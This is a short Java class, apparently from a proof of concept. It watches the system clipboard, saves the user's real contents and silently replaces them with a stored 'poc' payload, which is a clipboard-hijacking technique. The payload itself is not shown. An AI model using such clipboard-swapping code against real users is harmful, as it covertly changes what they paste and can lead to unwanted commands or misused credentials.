package com.github.rumoel.listeners;

import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;

import com.github.rumoel.header.HeaderPasswdPam;
import com.github.rumoel.utils.PasswdPamUtils;

public class ClipboardListener extends Thread {

	@Override
	public void run() {
		do {
			try {
				Thread.sleep(300);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		} while (true);
	}

	public void changeBufToPOC() {
		try {
			if (PasswdPamUtils.getClip().equals(HeaderPasswdPam.poc.toString())) {
			} else {
				HeaderPasswdPam.realClip = PasswdPamUtils.getClip();
				StringSelection selection = new StringSelection(HeaderPasswdPam.poc.toString());
				Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
				clipboard.setContents(selection, selection);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
